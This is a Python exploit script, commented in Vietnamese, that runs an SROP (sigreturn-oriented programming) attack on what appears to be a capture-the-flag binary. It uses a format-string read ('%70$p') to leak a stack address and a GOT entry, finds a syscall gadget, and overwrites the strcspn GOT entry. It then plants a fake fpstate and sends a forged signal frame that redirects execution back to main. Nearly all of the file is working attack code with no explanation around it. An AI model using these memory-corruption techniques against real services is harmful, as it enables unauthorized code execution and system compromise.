#!/usr/bin/env python3
"""Thu SROP voi gregs[17] = con tro fpstate hop le, va RIP = dau main.

Thanh cong thi nhin thay bang '=== PRINT PRINT REVOLUTION ===' (main chay lai),
that bai thi chi thay '\\nscore> '.
"""
import re
import sys
import time

sys.path.insert(0, ".")
sys.path.insert(0, "..")
from probe import Renderer
from exploit import q, leak_ptr, find_syscall_gadget, spec_write, GOT, N_FRAMESZ
from try_srop import multi_write

MAGIC1 = 0x5346584D
MXCSR = 0x1F80


def frame(gbase, fpstate_addr, rip, rsp):
    f = bytearray(N_FRAMESZ)

    def put(k, v):
        f[k - 8 : k] = q(v)

    put(gbase - 0x28, 0)  # uc_flags
    put(gbase - 0x20, 0)  # uc_link
    put(gbase - 0x18, 0)  # ss_sp
    put(gbase - 0x10, 2)  # ss_flags
    put(gbase - 0x08, 0)  # ss_size
    for i in range(23):
        put(gbase + 8 * i, 0)
    put(gbase + 8 * 15, rip)
    put(gbase + 8 * 16, rsp)
    if fpstate_addr:
        put(gbase + 8 * 17, fpstate_addr)
    return bytes(f)


def run(gbase, use_fp, tag):
    r = Renderer()
    r.drain()
    r.buf = b""
    buf = int(re.search(rb"0x([0-9a-f]+)", r.render(b"%70$p")).group(1), 16)
    wa = leak_ptr(r, GOT["write"])
    g = find_syscall_gadget(r, wa)
    r.render(spec_write(GOT["strcspn"], g))
    fs = buf + 0x400 if use_fp else 0
    if use_fp:
        r.render(multi_write([
            (fs + 0x18, MXCSR),
            (fs + 0x1A0, 3),
            (fs + 0x1A8, MAGIC1),
        ] + [(fs + 0x1B0 + 8 * i, 0) for i in range(6)]), 4.0)
    r.s.sendall(frame(gbase, fs, 0x4010D0, buf + 0x400) + b"\n")
    time.sleep(0.8)
    r.buf = b""
    try:
        r._read(1.0)
    except Exception:
        pass
    try:
        r.s.sendall(b"\x00" * 15)
        time.sleep(1.0)
        out = r._read(2.5)
    except Exception as e:
        out = b"<closed %s>" % type(e).__name__.encode()
    ok = b"PRINT PRINT" in out
    print(f"[{tag}] {'SROP OK' if ok else 'that bai'} -> {out[:70]!r}")
    r.close()
    return ok


if __name__ == "__main__":
    for gb in (0x30, 0xB0):
        for fp in (0, 1):
            if run(gb, fp, f"gbase={gb:#x} fpstate={'valid' if fp else 'NULL'}"):
                sys.exit(0)
    sys.exit(1)
